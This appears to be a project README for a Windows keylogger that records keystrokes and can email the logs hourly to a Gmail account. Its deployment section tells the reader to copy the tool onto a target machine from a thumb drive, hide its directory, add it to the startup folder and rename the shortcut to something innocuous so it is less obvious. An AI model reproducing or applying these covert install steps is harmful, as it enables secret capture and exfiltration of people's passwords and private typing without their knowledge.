# win-kl
A key-logger for Windows.

## Description
Pretty self explanatory, the project uses JNI to implement the needed native
code. Optionally, it can send a periodic email of the captured keys. Currently
only Gmail email accounts work.

## Dependencies
* A Windows OS - Not only to run on, but to build.
* MinGW - Specifically it's C compiler(gcc). Obviously you can use whatever
C compiler you want, but the project has been configured for MinGW's compiler,
it's pretty easy to install and add to your path.
* Maven - Another thing you could live without, but it makes things a lot
easier. Instructions to build the project without maven are not included...
* Java

## Building
Just use maven from the project's root directory:
`mvn package`

## Running/Deploying
After building with maven, the java portion of the project not only builds
the default artifact, but also a jar containing dependencies in order to make
running easier.

When deploying I typically create a directory:
```
mkdir deployment
cd deployment
```

Then I copy in the jar with dependencies, the dll(with the version in the name)
and a provided vbs script:
```
cp ..\win-kl-java\target\win-kl-java-0.1-jar-with-dependencies.jar .
cp ..\win-kl-native\target\win-kl-native-0.1.dll .
cp ..\win-kl-java\src\main\shell\win-kl.vbs .
```

I then modify the vbs script to contain whatever arguments I want. Then I copy
the directory to a thumb drive and when I want to deploy it to a system I copy
the directory to a discrete location, modify the vbs script to reference the
system's java location, create a shortcut to the vbs script and put it in the
startup directory in the start menu, make the deployment directory hidden, then
click the vbs shortcut and verify that there aren't any errors...you might
also rename the shortcut to the vbs script in the start menu to something like
windowsStartup or something less obvious...

#### Emailing Logs
When the user provides an email address and password at runtime, the app
will attempt to email logs to the given account. It does this by logging
in to the given account and emailing the log to itself with the system's
hostname as the subject line. It attempts to email at startup and every hour
after. Currently only Gmail accounts work.

## Arguments
The app doesn't require any arguments, it's default behavior is to log keys
to "keys.txt". The default behavior can be overridden by passing arguments:
<table>
    <tr>
        <td>--logFile=FILE_NAME_HERE</td>
        <td>The file location to write captured keys to.</td>
    </tr>
    <tr>
        <td>--emailAddress=yourEmail@gmail.com</td>
        <td>The address to email logs to.</td>
    </tr>
    <tr>
        <td>--emailPassword=yourPasswordHere</td>
        <td>The password for the given email account.</td>
    </tr>
</table>
